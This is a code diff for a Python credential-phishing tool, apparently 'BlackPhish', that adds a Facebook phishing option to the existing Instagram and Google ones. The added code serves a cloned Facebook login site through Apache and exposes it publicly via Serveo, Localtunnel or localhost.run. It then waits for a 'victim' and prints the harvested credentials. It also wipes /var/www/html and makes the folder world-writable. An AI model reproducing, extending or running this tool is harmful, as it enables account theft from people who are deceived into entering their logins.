@@ -10,7 +10,7 @@
 
 
 
-# version 1.7: - Code touch ups
+# version 1.8: - Added Facebook page - Small fixes
 
 # Please update version number each time we update
 
@@ -30,11 +30,11 @@ except ImportError:
 
 
 # Variables #
-cwd = getcwd() # Gets working directory
+cwd = getcwd() # Gets working directory #
 
-hostname = gethostname() # Get hostnameAdded localhost only - Some touch ups
+hostname = gethostname() # Get hostname #
 
-localip = gethostbyname(hostname) # Get local IP by hostname
+localip = gethostbyname(hostname) # Get local IP by hostname #
 
 
 
@@ -87,7 +87,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.7
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.8
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -98,7 +98,7 @@ def warning(): # Banner #
                     
                     Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[93;1m ''')
     print('\n')
-    warningchoice = input("                    Will you use this responsibly(\033[94;1my\033[93;1m/\033[91mn\033[93;1m?): ") # Agreement Message #
+    warningchoice = input("                    Will you use this responsibly (\033[94;1my\033[93;1m/\033[91mn\033[93;1m?): ") # Agreement Message #
 
     if warningchoice == 'y':
         print("")
@@ -127,7 +127,7 @@ def serveoForward():
 
 
 
-# Port forward with Localtunnel
+# Port forward with Localtunnel #
 def localTunnel():
     system('lt -p 80 --allow-invalid-cert')
 
@@ -172,7 +172,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.7
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.8
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -187,6 +187,7 @@ def banner():
                     
         [1]\033[94;1m Instagram \033[91;1m
         [2]\033[94;1m Google \033[91;1m
+        [3]\033[94;1m Facebook \033[91;1m
         [0]\033[94;1m Clean \033[91;1m
         [x]\033[94;1m Exit
         
@@ -233,7 +234,7 @@ def main():
         
         
         
-        # If select Instagram #
+        # Instagram #
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -389,7 +390,7 @@ def main():
 
 
 
-    # If select Google #
+    # Google #
     elif choice == '2':
         print('\n')
         print(red + '           [1]' + blue + ' Serveo (recommended)')
@@ -549,9 +550,170 @@ def main():
                         endMessage()
 
         else:
-            print(red + '[!] Invalid Option')
-            sleep(1)
+            print(red + '\n[!] Invalid Option')
+            sleep(2)
             main()
+            
+            
+            
+    # Facebook #
+    elif choice == '3':
+        print('\n')
+        print(red + '           [1]' + blue + ' Serveo (recommended)')
+        print(red + '           [2]' + blue + ' Localtunnel')
+        print(red + '           [3]' + blue + ' localhost.run')
+        print(red + '           [4]' + blue + ' Localhost only\n\n')
+        choice1 = input(red + "        [BlackPhish-Facebook] -> ")
+        
+        if choice1 == '1':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/')
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/')
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
+            print(yellow + '[*] Starting Serveo')
+            serveoForward() # Serveo port forward line:120 #
+            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+            sleep(0.1)
+            while True:
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
+
+        elif choice1 == '2':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/') 
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/') 
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
+            print(yellow + '[*] Starting Localtunnel')
+            localTunnel() # Localtunnel port forward line:128 #
+            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+            sleep(0.1)
+            while True: # Waits for content on usernames.txt #
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
+
+        elif choice1 == '3':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/')
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/')
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
+            print(yellow + '[*] Starting Localhost.run')
+            localhost() # Localhost.run port forward line:134 #
+            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+            sleep(0.1)
+            while True: # Waits for content on usernames.txt #
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
+
+        elif choice1 == '4':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/')
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/')
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
+            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+            sleep(0.1)
+            while True:
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
 
 
 
@@ -562,9 +724,9 @@ def main():
         print(green + '[+] Stopping Traffic forwarding to serveo')
         system('pkill -f inc0gnit0:80:localhost:80') # Stops serveo #
         print(green + '[+] Cleaning /var/www/html/')
-        system('rm -r /var/www/html/ && mkdir /var/www/html') # Removes and makes /var/www/html
+        system('rm -r /var/www/html/ && mkdir /var/www/html') # Removes and makes /var/www/html #
         print(green + '[+] Cleaning /Server/www/')
-        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes and makes /Server/www
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes and makes /Server/www #
         print(green + '[+] Done')
         main()
 
@@ -594,3 +756,8 @@ except KeyboardInterrupt:
     print(red + "[!] KeyboardInterrupt Detected")
     print(red + "[!] Exiting" + reset)
     exit(0)
+
+except:
+    print("\n")
+    print(red + "[!] An error occured")
+    print(red + "[!] Please make sure you followed directions" + reset)
